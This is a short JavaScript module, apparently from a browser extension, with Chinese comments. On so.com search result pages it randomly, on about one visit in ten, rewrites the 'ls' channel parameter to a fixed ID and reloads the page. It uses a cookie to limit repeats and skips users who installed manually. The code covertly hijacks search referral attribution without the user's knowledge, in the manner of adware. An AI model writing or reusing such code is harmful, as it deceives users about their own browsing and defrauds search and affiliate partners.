__tk__define(function (require, exports, module) {
	var utils = require('../utils');
	// 自主安装渠道的插件不弹
	if (utils.isManualDId) {
		return;
	}

	var url = utils.href,
	// 当前url是否是已跳转url
		isJumpedUrl = function() {
			// 以下链接不跳转
			var i, iLen,
			// 从2345首页跳转过来的hao123链接不跳转
				blackList = [
					'n048355b196'
				];

			for (i = 0, iLen = blackList.length; i < iLen; i++) {
				if (url.match(blackList[i])) {
					return false;
				}
			}
			if (url.match(/www.so.com\/s\?/) &&
				url.match(/ls=/) &&
				url.match(/src=lm/) &&
				url.match(/q=/)) {
				return true;
			}
			return false;
		},
	// url跳转函数
		urlJump = function() {
			var randomNum = utils.getRandom(0, 99);
			if (randomNum < 10) {
				document.location.href = utils.replaceUrlParam(url, 'ls', 'n048355b196');
			}
		};

	// 以下两种情况下允许hao123跳转
	// 1.直接访问hao123主页
	// 2.访问跳转后的链接，并且cookie不存在的情况
	if ((isJumpedUrl() && !utils.cookie.get().soTK)) {
		// 写入cookie, 通过cookie控制每隔一段时间跳转（防止死循环）
		utils.cookie.set({
			name: 'soTK',
			value: true,
			min: 5,
			path: '/',
			domain: 'so.com'
		});
		// cookie写入失败的场合（例如设置浏览器禁止写入cookie）不跳转链接
		if (utils.cookie.get().soTK) {
			urlJump();
		}
	}
});
